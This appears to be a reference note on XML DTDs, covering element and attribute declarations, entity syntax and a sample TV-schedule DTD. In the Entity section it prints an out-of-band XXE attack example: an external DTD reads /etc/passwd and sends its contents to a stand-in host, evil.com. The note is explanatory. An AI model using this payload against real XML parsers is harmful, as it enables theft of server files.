# XML DTD

* Stands for **Document Type Definition**
* Defines the structure that the xml document should have
* Specifies the DTD inside the first node \(beside the description\), in a `<!DOCTYPE>` \(without a closing `/` \)
* You can either :
  * Write it directly inside the document `<!DOCTYPE root_name [...]`
  * Include an external file `<!DOCTYPE root_name SYSTEM "file">`

## Element

```markup
<!ELEMENT element-name EMPTY>
<!ELEMENT element-name ANY>
<!ELEMENT element-name (#PCDATA)>
<!ELEMENT element-name (child1)>
<!ELEMENT element-name (child1, child2, ...)>
```

* `#PCDATA` \(_Parsed Character Data_\) __are interpreted by the parser while __ `#CDATA` \(_Character Data_\) aren't
* In the XML document, all children must be present and in the same order as in the DTD
* Some symbols add restrictions :

```markup
<!ELEMENT note (msg)> <!-- Only 1 child named msg -->
<!ELEMENT note (msg+)> <!-- 1 or multiple children named msg -->
<!ELEMENT element-name (msg*)> <!-- 0 or more children named msg -->
<!ELEMENT element-name (msg?)> <!-- 0 or 1 child named msg -->

<!-- to, from & header mandatory -->
<!-- either msg or body -->
<!ELEMENT note (to,from,header,(msg|body))> 
```

## Attributes

```markup
<!ATTLIST element_name attribute_name attribute_type attribute_value>
```

| Type | Definition |
| :--- | :--- |
| `CDATA` | Character data |
| `(val1|val2|..)` | One from the enumerated list |
| `(val1|val2|..) "val1"` | One from the enumerated list, defaulting to the specified one |
| `ID` | Unique id |
| `IDREF` | Id of another element |
| `IDREFS` | List of other ids |
| `NMTOKEN` | Valid XML name |
| `NMTOKENS` | List of valid XML names |
| `ENTITY` | Entity |
| `ENTITIES` | List of entities |
| `NOTATION` | Name of a notation |
| `xml:` | Predefined xml value |

| Value | Definition |
| :--- | :--- |
| `value` | The default value of the attribute |
| `#REQUIRED` | The attribute is required |
| `#IMPLIED` | The attribute is optional |
| `#FIXED value` | The attribute value is fixed |

## Entity

* They're variables that takes their value either from :
  * A given constant
  * A file, local or external

```markup
<!DOCTYPE test [
    <!ENTITY entity_name1 "entity-value">
    <!ENTITY entity_name2 SYSTEM "URI/URL">
]>
<test>&entity_name1;</test>
```

* Parameter entity are entities that can be directly referenced in the DTD
  * If they're external, they can reference another entity
  * This is an example of an attack :

```markup
<!-- test.xml-->
<?xml version="1.0" encoding="UTF-8 ?>
<!DOCTYPE test SYSTEM "http://evil.com/external.dtd">
<test>&send;</test>

<!-- external.dtd -->
    <!ENTITY % file_content SYSTEM "/etc/passwd">
    <!ENTITY % wrapper "<!ENTITY send 'http://evil.com/?%file_content;'>">
    %wrapper;
```

## Complete example

```markup
<!DOCTYPE TVSCHEDULE [

<!ELEMENT TVSCHEDULE (CHANNEL+)>
<!ELEMENT CHANNEL (BANNER,DAY+)>
<!ELEMENT BANNER (#PCDATA)>
<!ELEMENT DAY (DATE,(HOLIDAY|PROGRAMSLOT+)+)>
<!ELEMENT HOLIDAY (#PCDATA)>
<!ELEMENT DATE (#PCDATA)>
<!ELEMENT PROGRAMSLOT (TIME,TITLE,DESCRIPTION?)>
<!ELEMENT TIME (#PCDATA)>
<!ELEMENT TITLE (#PCDATA)> 
<!ELEMENT DESCRIPTION (#PCDATA)>

<!ATTLIST TVSCHEDULE NAME CDATA #REQUIRED>
<!ATTLIST CHANNEL CHAN CDATA #REQUIRED>
<!ATTLIST PROGRAMSLOT VTR CDATA #IMPLIED>
<!ATTLIST TITLE RATING CDATA #IMPLIED>
<!ATTLIST TITLE LANGUAGE CDATA #IMPLIED>
]>
```

